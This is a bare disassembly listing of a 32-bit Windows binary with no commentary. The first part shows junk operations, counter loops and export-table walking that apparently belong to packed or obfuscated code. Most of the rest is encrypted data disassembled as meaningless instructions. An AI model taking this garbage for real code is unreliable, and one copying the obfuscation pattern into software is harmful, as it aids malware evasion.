  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x7b3f5658
  40c577:	or     al,0x35
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	cwde   
  40c582:	scas   eax,DWORD PTR es:[edi]
  40c583:	imul   esp,DWORD PTR [edi+0x6f],0x20bee902
  40c58a:	adc    DWORD PTR [ecx],edx
  40c58c:	ss push esi
  40c58e:	sbb    eax,0x5b6dbb47
  40c593:	fst    DWORD PTR [ebx-0x54]
  40c596:	jne    0x40c5d8
  40c598:	jnp    0x40c5ca
  40c59a:	retf   0x7bd
  40c59d:	add    DWORD PTR [ebp+0x5c],esi
  40c5a0:	ins    DWORD PTR es:[edi],dx
  40c5a1:	xor    ecx,DWORD PTR [edx+0x4c]
  40c5a4:	jno    0x40c5ed
  40c5a6:	fisttp DWORD PTR [edi+0x13]
  40c5a9:	cmp    al,0x46
  40c5ab:	in     eax,dx
  40c5ac:	push   ecx
  40c5ad:	pop    ecx
  40c5ae:	pop    eax
  40c5af:	mov    ebx,0xbe6d78cc
  40c5b4:	in     al,0x2d
  40c5b6:	rol    esp,1
  40c5b8:	sbb    eax,0x17443843
  40c5bd:	xor    DWORD PTR [eax+0x7bd94449],0x1e671b96
  40c5c7:	into   
  40c5c8:	nop
  40c5c9:	pop    ebp
  40c5ca:	xor    DWORD PTR [ebx+0x53],ebx
  40c5cd:	fnstsw WORD PTR [ecx]
  40c5cf:	aad    0x94
  40c5d1:	retf   
  40c5d2:	outs   dx,DWORD PTR ds:[esi]
  40c5d3:	out    0xf1,eax
  40c5d5:	mov    al,ds:0x5af764f9
  40c5da:	mov    ds:0xcd8a1a0f,eax
  40c5df:	hlt    
  40c5e0:	inc    ebp
  40c5e1:	clc    
  40c5e2:	pop    eax
  40c5e3:	push   0x2f
  40c5e5:	jl     0x40c61c
  40c5e7:	sbb    eax,0xeb192530
  40c5ec:	mov    bh,0xdd
  40c5ee:	idiv   bl
  40c5f0:	iret   
  40c5f1:	adc    eax,edi
  40c5f3:	scas   al,BYTE PTR es:[edi]
  40c5f4:	bnd call 0x40787614
  40c5fa:	enter  0xb9be,0x50
  40c5fe:	cs ja  0x40c597
  40c601:	arpl   WORD PTR ds:0xf05e6cb5,sp
  40c607:	inc    esi
  40c608:	push   bx
  40c60a:	pop    edx
  40c60b:	jno    0x40c598
  40c60d:	xor    al,0xfb
  40c60f:	mov    ecx,0xb577b93d
  40c614:	loope  0x40c612
  40c616:	xchg   esi,eax
  40c617:	shl    DWORD PTR [edx],cl
  40c619:	jecxz  0x40c66d
  40c61b:	adc    al,0x97
  40c61d:	pop    ecx
  40c61e:	jne    0x40c5c3
  40c620:	push   ss
  40c621:	out    dx,eax
  40c622:	out    dx,eax
  40c623:	fnstcw WORD PTR [esi]
  40c625:	jle    0x40c688
  40c627:	(bad)  
  40c629:	stc    
  40c62a:	xor    bh,BYTE PTR [esi+0x13]
  40c62d:	mov    ds:0xa01c4a45,eax
  40c632:	and    BYTE PTR [ecx],0x73
  40c635:	stos   BYTE PTR es:[edi],al
  40c636:	pushf  
  40c637:	rcl    DWORD PTR [ebp-0x364487c],0x5c
  40c63e:	aam    0x37
  40c640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c641:	mov    bl,0x7e
  40c643:	sbb    DWORD PTR [edx-0x3c8e95ed],esi
  40c649:	cwde   
  40c64a:	or     BYTE PTR [esi],dl
  40c64c:	mov    al,0xb2
  40c64e:	cld    
  40c64f:	loopne 0x40c688
  40c651:	sbb    eax,0x44fc944c
  40c656:	sbb    BYTE PTR [ebx-0x51526e4c],cl
  40c65c:	dec    ebx
  40c65d:	and    al,0x18
  40c65f:	push   es
  40c660:	dec    DWORD PTR [eax+0x211d0012]
  40c666:	adc    al,0xac
  40c668:	or     BYTE PTR [edx],cl
  40c66a:	pop    edx
  40c66b:	xor    esp,esp
  40c66d:	or     eax,0x257a64b3
  40c672:	and    BYTE PTR [ecx-0x44],ch
  40c675:	xchg   DWORD PTR [edx],esi
  40c677:	cmp    al,0x49
  40c679:	xor    eax,0xed6ad432
  40c67e:	mov    esp,0xcfb4ab4
  40c683:	or     ebx,DWORD PTR [ebx]
  40c685:	pop    esp
  40c686:	jmp    0x40c638
  40c688:	jge    0x40c701
  40c68a:	loop   0x40c670
  40c68c:	add    DWORD PTR [esp+ecx*2-0x6c498c5a],edx
  40c693:	loope  0x40c6c1
  40c695:	dec    ebp
  40c696:	and    esp,edx
  40c698:	scas   eax,DWORD PTR es:[edi]
  40c699:	jmp    0x40c6db
  40c69b:	xor    DWORD PTR [edx-0x10c86a2a],edi
  40c6a1:	pop    ebx
  40c6a2:	mov    ?,WORD PTR [ebx]
  40c6a4:	and    al,0xd1
  40c6a6:	push   esi
  40c6a7:	stc    
  40c6a8:	or     DWORD PTR [ebx],ebx
  40c6aa:	mov    es,WORD PTR [ecx+0x5e10725e]
  40c6b0:	pop    esi
  40c6b1:	into   
  40c6b2:	call   0x66596001
  40c6b7:	dec    edx
  40c6b8:	and    DWORD PTR [eax+0x65],eax
  40c6bb:	push   cs
  40c6bc:	add    BYTE PTR [ecx-0x18],0x75
  40c6c0:	ins    BYTE PTR es:[edi],dx
  40c6c1:	jp     0x40c6bb
  40c6c3:	inc    esp
  40c6c4:	push   edx
  40c6c5:	mov    dl,0xe9
  40c6c7:	pop    ebp
  40c6c8:	jae    0x40c6a8
  40c6ca:	add    eax,0x4246ed1e
  40c6cf:	jmp    0x1e83159f
  40c6d4:	xor    DWORD PTR [ebx],edx
  40c6d6:	add    eax,0x244aa1d7
  40c6db:	mov    dl,0x0
  40c6dd:	cmp    dh,0x7f
  40c6e0:	mov    dl,0x26
  40c6e2:	jmp    0x40c675
  40c6e4:	das    
  40c6e5:	push   ecx
  40c6e6:	push   edi
  40c6e7:	dec    ebx
  40c6e8:	lahf   
  40c6e9:	mov    esp,0x75bcec75
  40c6ee:	lea    edx,[edi+ebp*4+0x8d81ff4]
  40c6f5:	push   ecx
  40c6f6:	mov    ah,BYTE PTR [edi]
  40c6f8:	addr16 pop esi
  40c6fa:	and    BYTE PTR [ecx],ch
  40c6fc:	and    ebp,DWORD PTR [eax+0x2]
  40c6ff:	mov    ds:0x7cfc672d,al
  40c704:	cmc    
  40c705:	jns    0x40c6f2
  40c707:	ss pop edi
  40c709:	test   ebp,esp
  40c70b:	adc    eax,0xdd395e51
  40c710:	loopne 0x40c6a8
  40c712:	inc    esi
  40c713:	pop    eax
  40c714:	dec    ebx
  40c715:	push   edx
  40c716:	icebp  
  40c717:	fld    TBYTE PTR [eax+eax*8+0x77b4bbbb]
  40c71e:	dec    esp
  40c71f:	mov    eax,0xe54adcf3
  40c724:	or     edx,DWORD PTR [ecx]
  40c726:	ds aam 0x1a
  40c729:	and    ah,dh
  40c72b:	push   0xffffffbd
  40c72d:	xchg   edi,eax
  40c72e:	loope  0x40c7ab
  40c730:	js     0x40c725
  40c732:	inc    eax
  40c733:	popf   
  40c734:	call   DWORD PTR [eax]
  40c736:	add    BYTE PTR [eax-0x2bbb8394],ch
  40c73c:	sbb    bh,BYTE PTR [ebx]
  40c73e:	ret    
  40c73f:	not    DWORD PTR [ebp-0x3f]
  40c742:	xor    BYTE PTR ds:0x1002a408,ah
  40c748:	jne    0x40c6ea
  40c74a:	or     eax,0xf384588
  40c74f:	cmp    ebx,DWORD PTR [ebp+0x76ae8086]
  40c755:	arpl   ax,bp
  40c757:	test   DWORD PTR [edi],edi
  40c759:	loope  0x40c6f3
  40c75b:	pushf  
  40c75c:	outs   dx,DWORD PTR ds:[esi]
  40c75d:	aas    
  40c75e:	sub    dh,BYTE PTR [ebx-0xc]
  40c761:	pop    edi
  40c762:	mov    edi,0x48944f91
  40c767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c768:	sub    DWORD PTR [esi+0x43],ebx
  40c76b:	shl    eax,1
  40c76d:	dec    edx
  40c76e:	cmp    al,0x14
  40c770:	mov    edx,0xbcc3ef87
  40c775:	int3   
  40c776:	push   ebp
  40c777:	sbb    eax,edx
  40c779:	mov    al,0xa7
  40c77b:	mov    al,ds:0x83ba98d7
  40c780:	mov    DWORD PTR [ecx-0x2dd860e9],ecx
  40c786:	mov    eax,0x95be39d7
  40c78b:	cwde   
  40c78c:	popa   
  40c78d:	xor    DWORD PTR [ecx+eiz*8-0x45],esp
  40c791:	mov    cl,0x1b
  40c793:	xor    dh,BYTE PTR [esi]
  40c795:	and    DWORD PTR [eax-0x1c0b19b1],0x948e4b61
  40c79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7a0:	cli    
  40c7a1:	sbb    ah,BYTE PTR [esi+edi*4-0x378ecb6b]
  40c7a8:	jb     0x40c73e
  40c7aa:	ins    DWORD PTR es:[edi],dx
  40c7ab:	push   edx
  40c7ac:	jns    0x40c806
  40c7ae:	jmp    0x40c790
  40c7b0:	jns    0x40c78a
  40c7b2:	ds pop ecx
  40c7b4:	pop    es
  40c7b5:	repnz pushf 
  40c7b7:	cmp    eax,0xa002b864
  40c7bc:	pop    ecx
  40c7be:	add    eax,0xa9c5998f
  40c7c3:	jp     0x40c803
  40c7c5:	and    ebp,ebx
  40c7c7:	sub    eax,0x62b0f9a2
  40c7cc:	xor    eax,0x65fae870
  40c7d1:	(bad)  
  40c7d2:	pushf  
  40c7d3:	(bad)  
  40c7d4:	fcom   DWORD PTR [esi]
  40c7d6:	(bad)  
  40c7d7:	call   ebx
  40c7d9:	xchg   BYTE PTR [esi-0x79ac4bef],al
  40c7df:	xchg   DWORD PTR [ebx+0x5],ebp
  40c7e2:	scas   al,BYTE PTR es:[edi]
  40c7e3:	pop    edi
  40c7e4:	in     al,dx
  40c7e5:	inc    ebx
  40c7e6:	out    0x2b,eax
  40c7e8:	mov    ecx,ecx
  40c7ea:	xchg   ecx,eax
  40c7eb:	dec    esp
  40c7ec:	xor    dl,dl
  40c7ee:	xchg   DWORD PTR [eax],ebx
  40c7f0:	fidiv  WORD PTR [esp+ecx*2+0x7dffa837]
  40c7f7:	test   DWORD PTR [esi+0x49],esp
  40c7fa:	pushf  
  40c7fb:	mov    bh,0xee
  40c7fd:	sbb    DWORD PTR [eax+eax*4+0x11],edi
  40c801:	xor    al,0xab
  40c803:	shr    DWORD PTR [esi+0x53],cl
  40c806:	mov    ebx,DWORD PTR ds:0x5ab2a3fd
  40c80c:	cs jl  0x40c7e8
  40c80f:	retf   
  40c810:	adc    BYTE PTR [eax],dl
  40c812:	pop    esi
  40c813:	stos   DWORD PTR es:[edi],eax
  40c814:	mov    ds:0x4ae1fd00,al
  40c819:	hlt    
  40c81a:	call   0xb1cebee9
  40c81f:	push   edx
  40c821:	repnz fimul DWORD PTR [ebp+ebx*1-0x57ba2bd3]
  40c829:	or     cl,BYTE PTR [eax-0x335e5503]
  40c82f:	fwait
  40c830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c831:	hlt    
  40c832:	lock mov dh,0x7b
  40c835:	jne    0x40c7b7
  40c837:	sub    BYTE PTR [edx-0x4d7a64b3],ah
  40c83d:	mov    ebx,DWORD PTR [ebx-0x5e]
  40c840:	repnz fisttp WORD PTR [eax+0x2ed699f6]
  40c847:	pop    ebp
  40c848:	loop   0x40c7da
  40c84a:	dec    edx
  40c84b:	hlt    
  40c84c:	fwait
  40c84d:	xor    ebx,DWORD PTR [ecx-0x40a10593]
  40c853:	sub    bh,BYTE PTR [esi+0x1fa20cdd]
  40c859:	add    edi,DWORD PTR [ebx-0x28]
  40c85c:	cmp    al,0xa0
  40c85f:	aaa    
  40c860:	xchg   ecx,eax
  40c861:	js     0x40c8c8
  40c863:	aaa    
  40c864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c865:	lock xor ebp,edi
  40c868:	add    eax,0x885c664f
  40c86d:	sbb    ecx,0x2e1bbdba
  40c873:	mov    cl,0xd2
  40c875:	and    al,0xcc
  40c877:	fwait
  40c878:	fs stos DWORD PTR es:[edi],eax
  40c87a:	push   ebp
  40c87b:	mov    BYTE PTR ds:0xb089c155,bh
  40c881:	inc    esi
  40c882:	imul   DWORD PTR [ebp-0x75]
  40c885:	inc    ebp
  40c886:	in     al,dx
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	push   edx
  40c8b3:	les    ecx,FWORD PTR [ebx+edx*1]
  40c8b6:	daa    
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	inc    ebx
  40c8bf:	jle    0x40c897
  40c8c1:	retf   0xc793
  40c8c4:	mov    ebp,0x77f77cd7
  40c8c9:	pop    esi
  40c8ca:	mov    eax,0xbcd3afbe
  40c8cf:	mov    eax,ds:0x3583911d
  40c8d4:	rol    BYTE PTR [ebp+0x39],0x20
  40c8d8:	out    0xb9,al
  40c8da:	(bad)  
  40c8db:	ffree  st(5)
  40c8dd:	add    al,0xe3
  40c8df:	add    ebx,esp
  40c8e1:	pusha  
  40c8e2:	add    edx,edi
  40c8e4:	mov    DWORD PTR [eax],ebp
  40c8e6:	sar    eax,0xf4
  40c8e9:	ja     0x40c8f9
  40c8eb:	bound  ebp,QWORD PTR [eax]
  40c8ed:	jo     0x40c936
  40c8ef:	sbb    DWORD PTR [edi],edi
  40c8f1:	aad    0xa3
  40c8f3:	mov    eax,0xb5a941d7
  40c8f8:	pop    esi
  40c8f9:	mov    ah,0xa1
  40c8fb:	push   esi
  40c8fc:	sbb    eax,0x21b5b737
  40c901:	xor    ch,dh
  40c903:	loopne 0x40c8dc
  40c905:	push   es
  40c906:	mov    edx,0xdd689367
  40c90b:	cwde   
  40c90c:	mov    eax,ds:0xb6d695d7
  40c911:	in     eax,dx
  40c912:	popf   
  40c913:	mov    esp,0x2eea70ac
  40c918:	xor    eax,0x1c29b7a0
  40c91d:	and    BYTE PTR [ebx-0x54dc61a2],dh
  40c923:	test   DWORD PTR [edx-0x35],esp
  40c926:	in     al,dx
  40c927:	(bad)  
  40c928:	lahf   
  40c929:	in     al,dx
  40c92a:	and    ebp,DWORD PTR [esi-0x7ce9f934]
  40c930:	dec    eax
  40c931:	add    BYTE PTR [eax+0x48],0x0
  40c935:	aad    0x3f
  40c937:	loope  0x40c8ea
  40c939:	ins    BYTE PTR es:[edi],dx
  40c93a:	xor    edx,DWORD PTR [bp+si-0x263a]
  40c93f:	jle    0x40c8eb
  40c941:	test   DWORD PTR [eax-0x69],edx
  40c944:	sub    ah,ch
  40c946:	jb     0x40c8fc
  40c948:	sub    DWORD PTR [edi-0x57bb3fad],ecx
  40c94e:	push   ebp
  40c94f:	xchg   edx,eax
  40c950:	mov    ah,0xa1
  40c952:	ins    BYTE PTR es:[edi],dx
  40c953:	rol    BYTE PTR [ebp-0x7a],1
  40c956:	hlt    
  40c957:	in     eax,0xc1
  40c959:	add    bl,dl
  40c95b:	lock xchg edi,eax
  40c95d:	stc    
  40c95e:	add    ax,0x5b0b
  40c962:	sub    eax,0x8e410fd2
  40c967:	inc    edx
  40c968:	xor    ebp,DWORD PTR [ecx+edi*4-0x1e]
  40c96c:	sbb    eax,0xbc728c4d
  40c971:	stc    
  40c972:	push   eax
  40c973:	add    ecx,edi
  40c975:	out    dx,eax
  40c976:	popa   
  40c977:	jb     0x40c973
  40c979:	test   al,0x49
  40c97b:	add    al,0xc7
  40c97d:	out    0xa8,eax
  40c97f:	rcl    BYTE PTR ds:[ecx+0x4a527639],1
  40c986:	pop    ds
  40c987:	(bad)  
  40c988:	xchg   edi,eax
  40c989:	inc    ecx
  40c98a:	push   0xffffff99
  40c98c:	pop    ecx
  40c98d:	or     DWORD PTR [ebx],ebp
  40c98f:	pop    esi
  40c990:	std    
  40c991:	mov    ch,0x27
  40c993:	jle    0x40c91f
  40c995:	inc    esp
  40c996:	inc    ecx
  40c997:	in     eax,0x2c
  40c999:	aaa    
  40c99a:	cmp    al,0xfe
  40c99c:	lock sahf 
  40c99e:	jl     0x40c968
  40c9a0:	popa   
  40c9a1:	and    BYTE PTR [edi],dl
  40c9a3:	cmc    
  40c9a4:	mov    al,0x4a
  40c9a6:	xchg   BYTE PTR [edx+ebx*4+0x709baa4f],dh
  40c9ad:	es and al,0xb3
  40c9b0:	push   edx
  40c9b1:	pushf  
  40c9b2:	cmp    ecx,DWORD PTR [eax+ebx*8-0x13dc1ccb]
  40c9b9:	imul   esi,DWORD PTR [esi+0xf],0xfde6cd7
  40c9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c1:	(bad)  
  40c9c2:	lods   eax,DWORD PTR ds:[esi]
  40c9c3:	lods   al,BYTE PTR ds:[esi]
  40c9c4:	ret    0x1355
  40c9c7:	mov    dl,0x98
  40c9c9:	xchg   esp,eax
  40c9ca:	xchg   esi,eax
  40c9cb:	adc    al,0x7f
  40c9cd:	ror    esi,cl
  40c9cf:	loope  0x40c960
  40c9d1:	and    eax,0x7c0d42ce
  40c9d6:	mov    ebx,0xc37fb7f5
  40c9db:	popf   
  40c9dc:	inc    ecx
  40c9dd:	or     ebp,edi
  40c9df:	mov    bl,0x2a
  40c9e1:	out    0x6a,eax
  40c9e3:	and    eax,DWORD PTR [ebp-0xe]
  40c9e6:	xchg   ecx,eax
  40c9e7:	add    BYTE PTR fs:[ecx+esi*4],ah
  40c9eb:	jne    0x40c9f4
  40c9ed:	xchg   esp,eax
  40c9ee:	push   0xf9265b13
  40c9f3:	adc    al,BYTE PTR [eax+edi*8+0x34530a52]
  40c9fa:	mov    ds:0x7a762a93,eax
  40c9ff:	inc    ebx
  40ca00:	xchg   edi,eax
  40ca01:	(bad)  
  40ca02:	repnz push 0x69
  40ca05:	aaa    
  40ca06:	jnp    0x40c9da
  40ca08:	pop    edi
  40ca09:	sub    al,0x56
  40ca0b:	imul   ecx,DWORD PTR [edx+0x66c73ea2],0x86934a31
  40ca15:	push   0x51d78bca
  40ca1a:	add    ebp,edx
  40ca1c:	jae    0x40c9cb
  40ca1e:	(bad)  
  40ca1f:	dec    esp
  40ca20:	and    BYTE PTR [edi+esi*2-0x24cf1385],bl
  40ca27:	neg    ebx
  40ca29:	sbb    ebx,DWORD PTR [edx+0x1538a055]
  40ca2f:	stos   DWORD PTR es:[edi],eax
  40ca30:	gs or  al,0xd
  40ca33:	fidivr DWORD PTR [ebx]
  40ca35:	cli    
  40ca36:	pop    ebp
  40ca37:	ins    BYTE PTR es:[edi],dx
  40ca38:	add    ch,BYTE PTR [ebp-0x1ceec21e]
  40ca3e:	dec    ecx
  40ca3f:	addr16 xchg esp,edi
  40ca42:	lea    ecx,[ecx-0x2e66e5c0]
  40ca48:	dec    esp
  40ca49:	aad    0xd9
  40ca4b:	or     esi,esp
  40ca4d:	imul   eax,DWORD PTR [ecx+ebp*2-0x6],0x21
  40ca52:	les    ebx,FWORD PTR [esi+0x57]
  40ca55:	mov    cl,0xf9
  40ca57:	stos   BYTE PTR es:[edi],al
  40ca58:	in     al,0x51
  40ca5a:	ret    
  40ca5b:	sbb    al,0xeb
  40ca5d:	pop    eax
  40ca5e:	js     0x40c9f4
  40ca60:	mov    ah,0x28
  40ca62:	xchg   esi,eax
  40ca63:	xor    al,0x2d
  40ca65:	imul   eax,DWORD PTR [esi+edx*4+0x13],0xffffffe9
  40ca6a:	sar    al,1
  40ca6c:	int    0x58
  40ca6e:	aas    
  40ca6f:	inc    esi
  40ca70:	shl    DWORD PTR [esi+0x25e6f8],0x21
  40ca77:	pushf  
  40ca78:	push   ebx
  40ca79:	mov    edx,0x2e1e8779
  40ca7e:	out    dx,eax
  40ca7f:	mov    ds:0xde995f9e,al
  40ca84:	std    
  40ca85:	push   0xb9d8dba4
  40ca8a:	add    DWORD PTR [ecx],0x26
  40ca8d:	imul   esp,DWORD PTR [edi+0x617b36f5],0xf8b3fbeb
  40ca97:	loop   0x40ca56
  40ca99:	push   esi
  40ca9a:	rol    BYTE PTR [ebx-0x7c],cl
  40ca9d:	or     al,0x3b
  40ca9f:	pop    edx
  40caa0:	mov    esp,0xe38bcbbe
  40caa5:	xacquire xchg BYTE PTR [esi+eax*4+0x20d950b],ch
  40caad:	stc    
  40caae:	jb     0x40ca87
  40cab0:	sar    DWORD PTR [edi+esi*8-0x444ebcfd],0xaf
  40cab8:	pop    DWORD PTR [ecx]
  40caba:	sub    eax,0xeda1e4b
  40cabf:	dec    edx
  40cac0:	add    DWORD PTR [ebx+0x2],eax
  40cac3:	dec    ebx
  40cac4:	bound  ebx,QWORD PTR ds:0x96a13df4
  40caca:	idiv   BYTE PTR [esi+eiz*2+0x5568d4ca]
  40cad1:	jp     0x40cac8
  40cad3:	je     0x40cb39
  40cad5:	sub    cl,BYTE PTR ds:[edi]
  40cad8:	mov    dl,0x6b
  40cada:	sbb    DWORD PTR [edi],ecx
  40cadc:	xchg   esp,eax
  40cadd:	or     DWORD PTR [edx-0x22],ecx
  40cae0:	out    0xe3,al
  40cae2:	xor    al,0xc5
  40cae4:	js     0x40ca85
  40cae6:	cmp    DWORD PTR [eax+0xd],eax
  40cae9:	or     al,0xab
  40caeb:	outs   dx,BYTE PTR ds:[esi]
  40caec:	xor    dh,ah
  40caee:	sub    eax,0xd07c48bf
  40caf3:	jbe    0x40caf8
  40caf5:	fisttp DWORD PTR ss:[ecx+0x535bdbee]
  40cafc:	xchg   DWORD PTR [ecx+esi*8+0x39],ebp
  40cb00:	stos   DWORD PTR es:[edi],eax
  40cb01:	cmc    
  40cb02:	sti    
  40cb03:	(bad)  
  40cb04:	cmc    
  40cb05:	adc    DWORD PTR [edi],eax
  40cb07:	pusha  
  40cb08:	inc    ebp
  40cb09:	jmp    0x304f414b
  40cb0e:	and    al,0x75
  40cb10:	or     esp,DWORD PTR [eax+ecx*8+0x6a96e7b8]
  40cb17:	fdivr  DWORD PTR [ebx+0x5a]
  40cb1a:	ret    
  40cb1b:	dec    eax
  40cb1c:	fcom   QWORD PTR [eax]
  40cb1e:	std    
  40cb1f:	mov    WORD PTR [edx-0x765de526],es
  40cb25:	mov    esp,0x3085a6a3
  40cb2a:	jecxz  0x40cb64
  40cb2c:	pop    ebp
  40cb2d:	lds    edi,FWORD PTR [esi+0x67]
  40cb30:	into   
  40cb31:	add    eax,0x4463dd2b
  40cb36:	jp     0x40cb44
  40cb38:	mov    esi,0x2db6d6ca
  40cb3d:	icebp  
  40cb3e:	xchg   edi,eax
  40cb3f:	xor    DWORD PTR [ebp-0x50235f28],ebp
  40cb45:	aam    0xf3
  40cb47:	out    0x86,al
  40cb49:	pop    ecx
  40cb4a:	loope  0x40cafd
  40cb4c:	dec    ebp
  40cb4d:	aas    
  40cb4e:	xchg   cl,al
  40cb50:	mov    ebx,0x97cbf771
  40cb55:	fdiv   QWORD PTR [esi+edi*8+0x45]
  40cb59:	repz bound esp,QWORD PTR [ebp+0x6298aabe]
  40cb60:	jnp    0x40cbad
  40cb62:	add    al,0x71
  40cb64:	mov    al,0x59
  40cb66:	xchg   ebx,eax
  40cb67:	cmp    DWORD PTR [eax],0xf9feeb45
